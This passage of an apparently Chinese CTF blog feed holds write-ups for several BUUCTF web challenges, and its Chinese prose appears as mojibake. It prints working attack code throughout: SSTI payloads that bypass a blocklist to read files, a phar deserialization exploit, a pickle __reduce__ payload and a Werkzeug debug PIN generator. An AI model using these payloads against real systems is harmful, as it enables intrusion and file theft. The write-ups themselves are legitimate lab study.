class="hljs-string">&#x27;file&#x27;</span>]);<span class="hljs-keyword">echo</span> file_get_contents(change($_GET[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>åŠ ä¸ªè¯·æ±‚å¤´ï¼š<code>Client-IP: 127.0.0.1</code>         </p><p>changeè§£å¯†å‡½æ•°ï¼Œæ®æ­¤å†™å‡ºåŠ å¯†å‡½æ•°      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123;     $re = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> );     &#125;     $re=base64_encode($re);    <span class="hljs-keyword">return</span> $re; &#125;$flag = change(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-keyword">echo</span> $flag;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>file_geté‚£é‡Œå¯ä»¥ç”¨åè®®æäº¤<code>php://input</code>æˆ–è€…<code>data:text/plain</code> </p><p>payload1:<code>?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code><br>payload2:<img src="https://ftp.bmp.ovh/imgs/2021/03/1ba0210e72704c0b.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GWCTF 2019æ¯ç‡¥çš„æŠ½å¥–</title>
    <link href="/2021/03/22/BUU58/"/>
    <url>/2021/03/22/BUU58/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="**"></a>**</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/2f3b6c263dd6eecf.png"><br>çœ‹çœ‹æºç ï¼Œå‘ç°<code>check.php</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/0a6a513255dc65de.png"><br>éšæœºæ•°<br>æ²¡æœ‰seedï¼Œæ¯”è¾ƒè¿˜æ˜¯<code>===</code><br>çœ‹WPå§<br><code>php mt_seedä¼ªéšæœºæ•°æ¼æ´</code><br>éœ€è¦æ ¹æ®ç»™çš„å‰åä½ç”¨<code>php_mt_seed</code>è¿™ä¸ªå·¥å…·çˆ†ç ´å‡ºseedï¼Œç„¶åæ ¹æ®seedæ‰§è¡Œä»£ç å¾—åˆ°<code>$str</code>ï¼Œç„¶åæäº¤å³å¯<br>å…ˆå°†å‰åä½è½¬æ¢ä¸º<code>php_mt_seed</code>éœ€è¦çš„æ ¼å¼      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;FiPnfNN8Dn&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç„¶åä½¿ç”¨<a href="https://github.com/openwall/php_mt_seed"><code>php_mt_seed</code></a>ç ´è§£<br><img src="https://ftp.bmp.ovh/imgs/2021/03/95b8910573cb67a3.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/03/2ac04e18e3d1300d.png"> </p><p>é‡æ–°ç”Ÿæˆéšæœºæ•°ï¼š      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-string">&#x27;520423665&#x27;</span>);$str_long1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;$str=<span class="hljs-string">&#x27;&#x27;</span>;$len1=<span class="hljs-number">20</span>;<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       &#125;<span class="hljs-comment">//$str_show = substr($str, 0, 10);</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>; <span class="hljs-meta">?&gt;</span></code></pre></code></pre><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://www.freebuf.com/vuls/192012.html">php mt_rand</a>   </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dropbox</title>
    <link href="/2021/03/21/BUU57/"/>
    <url>/2021/03/21/BUU57/</url>
    
    <content type="html"><![CDATA[<h2 id="å¥½éš¾"><a href="#å¥½éš¾" class="headerlink" title="å¥½éš¾"></a>å¥½éš¾</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/d3fb5b0878474c49.png"><br>è¯•äº†ä¸€æ³¢SQLæ³¨å…¥ï¼Œæ„Ÿè§‰ä¸è¡Œ<br>æ³¨å†Œâ€”â€“ç™»å½•â€”â€“ä¸Šä¼ ä¸ªæ–‡ä»¶ï¼ˆè¿™é‡Œä¸Šä¼ æ–‡ä»¶ä¹Ÿä¸è¡Œï¼‰<br><img src="https://ftp.bmp.ovh/imgs/2021/03/1f1922e979bb74c1.png"><br>ä¸‹è½½â€”æŠ“åŒ…<br>å‘ç°å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè®°å¾—è¦è·³åˆ°ä¸Šçº§ç›®å½•<code>../../</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/8dbcc3256e9e1151.png"><br>æœ€ç»ˆå°†æ‰€æœ‰PHPæ–‡ä»¶è¯»å–å‡ºæ¥ï¼Œä½†ä¸èƒ½ç›´æ¥è¯»flagï¼Œè¢«è¿‡äº†<br><img src="https://ftp.bmp.ovh/imgs/2021/03/78134ae933f2e358.png"><br>æ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡äº†    </p><p><code>class.php</code>é‡Œ      </p><pre><code>public function close() &#123;    return file_get_contents($this-&gt;filename);  public function __destruct() &#123;    $this-&gt;db-&gt;close();      </code></pre><p>ä½†æ²¡æœ‰è¾“å‡ºï¼Œä¹Ÿæ²¡æœ‰ååºåˆ—åŒ–çš„åœ°æ–¹<br>è¾“å‡ºâ€”&gt;filelistçš„destructé‡Œæœ‰ä¸ªecho      </p><p>phar(â€œPhp Archiveâ€)æ˜¯PHPé‡Œçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼›å…¶ä¸­çš„æ•°æ®ä»¥åºåˆ—åŒ–çš„å½¢å¼ä¿å­˜ã€‚<br>pharæ–‡ä»¶ç»“æ„ï¼š    </p><ol><li><p>stub  </p><p>  ä¾›pharæ‰©å±•ç”¨äºè¯†åˆ«çš„æ ‡å¿—ï¼Œæ ¼å¼ï¼š<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>xxxéšæ„ï¼Œå¯ä»¥åœ¨å‰é¢ä½¿ç”¨æ–‡ä»¶å¤´ä¼ªé€ å›¾ç‰‡ç­‰<code>GIF98a</code>       </p></li><li><p>manifest     </p><p> pharæœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œæ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<code>meta-data</code>ï¼Œè¿™å°±æ˜¯è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ã€‚    </p></li><li><p>contents     </p><p> å†…å®¹        </p></li><li><p>signature      </p><p> ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾          </p></li></ol><p>æ‰€ä»¥å¯ä»¥å°†æˆ‘ä»¬æ„é€ ååºåŒ–è„šæœ¬æ”¾å…¥pharï¼Œç”Ÿæˆpharæ–‡ä»¶ï¼Œå†ç”¨<code>phar://</code>ååºåˆ—åŒ–       </p><p>popé“¾ï¼š<code>User-&gt;$db-&gt;FileList-&gt;$files-&gt;File</code>     </p><p>å¤§ä½¬çš„è„šæœ¬ï¼š        </p><pre><code>```php&lt;?phpclass User &#123;    public $db;&#125;class File &#123;    public $filename;&#125;class FileList &#123;    private $files;    public function __construct() &#123;        $file = new File();        $file-&gt;filename = &quot;/flag.txt&quot;;        $this-&gt;files = array($file);    &#125;&#125;$a = new User();$a-&gt;db = new FileList();$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;```       </code></pre><p>è¿è¡Œåä¼šç”Ÿæˆä¸ª<code>phar.phar</code>æ–‡ä»¶<br>è¿è¡ŒæŠ¥é”™çš„è¯ï¼Œè¦æ”¹ä¸€ä¸‹<code>php.ini</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/dc7fa7ae8eec3de3.png"><br><code>phar.readonly</code>é»˜è®¤æ˜¯å¼€å¯çš„<br>å°†æ–‡ä»¶ä¸Šä¼ ï¼Œæ”¹<code>Content-Type: image/gif</code><br>ä¸Šä¼ ååˆ é™¤æ­¤æ–‡ä»¶ï¼ŒæŠ“åŒ…<br><img src="https://ftp.bmp.ovh/imgs/2021/03/8b004b7f88b8ad26.png">    </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://xz.aliyun.com/t/2715">phar</a>    </p><ul><li>åˆ©ç”¨æ¡ä»¶ï¼š      </li><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ï¼Œ<code>file_exists()</code>ã€<code>fopen()</code>ã€<code>file_get_contents()</code>ã€<code>file()</code>ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°       </li><li>æœ‰å¯ç”¨çš„é­”æ³•å‡½æ•°ä½œä¸ºâ€œè·³æ¿â€       </li><li>å…³é”®å­—ç¬¦æœªè¢«è¿‡æ»¤<code>:</code>ã€<code>/</code>ã€<code>phar</code>       </li></ul><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">more</a><br><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">more</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU56</title>
    <link href="/2021/03/18/BUU56/"/>
    <url>/2021/03/18/BUU56/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[GYCTF2020]FlaskApp<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9fd70301dbc831c0.png"> </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>SSTI<br><code>&#123;&#123;1+1&#125;&#125;</code>åŠ å¯†åè§£å¯†è¿”å›2<br>ç›´æ¥ç”¨ä¹‹å‰çš„payloadæ‰“ä¸€ä¸‹â€”â€“&gt;è¿”å›<code>nonono!</code><br>åº”è¯¥æœ‰è¿‡æ»¤<br>æŠ¥é”™çš„è¿”å›ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7415444900c60886.png"><br>è¯´æ˜å¼€å¯äº†debugæ¨¡å¼ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„å®Œæ•´è·¯å¾„    </p><p><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>è¯»ä¸€ä¸‹æ–‡ä»¶<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/c46cda6028fdd98b.png"><br>å¯ä»¥çœ‹åˆ°æœ‰WAF     </p><pre><code><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span> black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;</span>,&amp;<span class="hljs-comment">#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;</span>,&amp;<span class="hljs-comment">#34;chr&amp;#34;,&amp;#34;request&amp;#34;</span>,&amp;<span class="hljs-comment">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;</span>,&amp;<span class="hljs-comment">#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;</span>,&amp;<span class="hljs-comment">#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower():<span class="hljs-keyword">return</span> <span class="hljs-number">1</span></code></pre></code></pre><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>ä¸€ã€<br>å¯ä»¥å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡<br> <code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/97db9f96462955ee.png"><br>æ‰“å¼€<code>this_is_the_flag.txt</code>å³å¯<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p><p>äºŒã€<br>å­—ç¬¦ä¸²å€’è½¬<code>[::-1]</code>         </p><pre><code>s=&quot;/this_is_the_flag.txt&quot;print(s[::-1])##ç»“æœï¼štxt.galf_eht_si_siht/     </code></pre><p>payloadï¼š<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p><p>ä¸‰ã€<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a18776be9dbf759f.png">    </p><p>ç”ŸæˆPINçš„expï¼š      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chainprobably_public_bits = [    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span>]private_bits = [    <span class="hljs-string">&#x27;2485377875088&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>    <span class="hljs-string">&#x27;5d9996326aaf665611dc77291ca91fc7e65f0429cfaec25692ea858467358a1c&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span>]h = hashlib.md5()<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)    h.update(bit)h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]num = <span class="hljs-literal">None</span><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]rv =<span class="hljs-literal">None</span><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span>:        rv = numprint(rv)</code></pre></code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/03/6cf573d94733f77f.png"><br>ç‚¹å‡»è¿™ä¸ª<br><img src="https://ftp.bmp.ovh/imgs/2021/03/0f34b27fdd395a9c.png"><br>å¡«å…¥ç”Ÿæˆçš„PINç ï¼Œå³å¯è¿›å…¥pythonäº¤äº’æ¨¡å¼ï¼Œç„¶ååœ¨è¿™é‡Œæ‰§è¡Œå‘½ä»¤æ‰¾flagå³å¯<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c7ba641e0112a209.png"></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="http://www.91ri.org/17362.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®°</a><br><a href="https://zhuanlan.zhihu.com/p/32138231">Flaskå¼€å¯debugæ¨¡å¼ç­‰äºç»™é»‘å®¢ç•™äº†åé—¨</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/18/BUU055/"/>
    <url>/2021/03/18/BUU055/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun<br><img src="https://ftp.bmp.ovh/imgs/2021/03/447a0694ccac2a24.png">    </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æœ‰æç¤º<br>åœ¨ä¸‹é¢ç‚¹ä¸‹ä¸€é¡µçš„è¯ï¼ŒURLå°±å˜æˆäº†<code>http://c472e76d-638c-4834-ae42-125f0a073ed7.node3.buuoj.cn/shop?page=2</code><br>å†™ä¸ªè„šæœ¬æ‰¾LV6    </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):    time.sleep(<span class="hljs-number">0.1</span>)    url=<span class="hljs-string">&#x27;http://fc76ee12-4b8a-4064-9eb3-84b2e8a5c4f9.node3.buuoj.cn/shop?page=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)    r=requests.get(url=url)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> r.text:        print(i)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>åœ¨181é¡µ<br>æ³¨å†Œè´¦å·ï¼Œè´­ä¹°ï¼Œç»“ç®—æ—¶æŠ“åŒ…æ”¹<code>discount</code>â€”ç„¶åå‘åŒ…      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/010d17c39847ea49.png"><br>æ¥ä¸‹æ¥è¦æ”¹<code>JWT</code>äº†<br><img src="https://ftp.bmp.ovh/imgs/2021/03/14d76e68917280b2.png">   </p><p>JWTç”±Headerã€Payloadã€Signatureä¸‰éƒ¨åˆ†ç»„æˆï¼Œä¸­é—´ä»¥åœ†ç‚¹(.)è¿æ¥<br>å‰ä¸¤éƒ¨åˆ†å‡ä»¥base64ç¼–ç <br><code>Signature=HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code>        </p><p>JWTç ´è§£å·¥å…·â€”â€”-&gt;<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a><br>ç”¨æ³•ï¼šéœ€è¦å…ˆ<a href="https://zhuanlan.zhihu.com/p/82361096">å®‰è£…docker</a>;ç„¶åæŒ‰ç…§Githubä¸Šçš„ä½¿ç”¨<br><img src="https://ftp.bmp.ovh/imgs/2021/03/b4eb75fe8f58961f.png"><br>ç„¶ååœ¨<a href="https://jwt.io/">è¿™ä¸ªç½‘ç«™</a>ä¸Šç”Ÿæˆæ–°çš„JWT<br><img src="https://ftp.bmp.ovh/imgs/2021/03/2fcaed2eca6a14cc.png"><br>ä¿®æ”¹â€”å‘åŒ…<br>åœ¨æºç ä¸­å‘ç°<br><img src="https://ftp.bmp.ovh/imgs/2021/03/8f5846239e5ea5ed.png"> </p><p>ç„¶åæ˜¯<code>Admin.py</code>é‡ŒPickleååºåˆ—åŒ–<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9badbf37f31eb602.png">   </p><p> <code>pickle.dump(obj,file,[,protocol])</code>   </p><pre><code>å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚file:æ–‡ä»¶åç§°ã€‚protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p><code>pickle.load(file)</code>     </p><pre><code>å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚fileï¼šæ–‡ä»¶åç§°ã€‚</code></pre><p><code>pickle.dumps(obj[,protocol])</code>     </p><pre><code>å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p><code>pickle.loads(string)</code>     </p><pre><code>å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚stringï¼šæ–‡ä»¶åç§°ã€‚ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç      </code></pre><p><a href="https://blog.csdn.net/satasun/article/details/109708593?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242">è½¬è‡ª</a>   </p><p><code>__reduce__</code>é­”æ³•å‡½æ•°      </p><pre><code>  __reduce__ è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆ    è¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ __setstate__ çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰      </code></pre><p>ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼š</p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> os<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">return</span> (os.listdir,(<span class="hljs-string">&#x27;/&#x27;</span>,))    a = pickle.dumps(payload())<span class="hljs-comment">###python3éœ€è¦ç”¨ä¸‹é¢çš„å†™æ³•</span><span class="hljs-comment">###a = pickle.dumps(payload(),protocol=0)</span>a = urllib.quote(a)<span class="hljs-built_in">print</span> 